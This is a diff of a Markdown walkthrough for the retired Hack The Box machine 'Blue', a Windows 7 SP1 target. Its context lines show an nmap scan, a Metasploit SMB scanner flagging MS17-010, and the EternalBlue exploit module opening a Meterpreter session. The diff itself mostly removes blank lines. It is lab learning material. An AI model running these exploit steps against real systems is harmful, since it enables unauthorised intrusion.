@@ -23,8 +23,6 @@ cover:
 
 The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.
 
-# Blue (HTB) — Walkthrough
-
 ## Overview
 - **Platform:** Hack The Box (retired)  
 - **Target OS:** Windows 7 Professional SP1  
@@ -45,7 +43,6 @@ nmap -sV -sC -oN scans/blue-initial 10.129.242.117
 445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
 A full scan confirmed SMB was exposed and appeared to be running SMBv1.
 ![Nmap ports output showing SMB 445 open](/images/blue/nmap.png)
-
 
 ---
 
@@ -87,7 +84,6 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 [+] 10.129.242.117:445 - Host is running Windows 7 Professional SP1
 ![Metasploit auxiliary module - SMB scanner](/images/blue/metasploit_scanner.png)
 
-
 **Host is likely VULNERABLE to MS17-010!**
 
 ---
@@ -102,12 +98,10 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 ```
 ![Metasploit exploit module - ms17_010_eternalblue](/images/blue/metasploit_exploit.png)
 
-
 **Success:**
 
 [+] Meterpreter session 1 opened
 ![Meterpreter session to shell](/images/blue/meterpreter_shell.png)
-
 
 ---
 
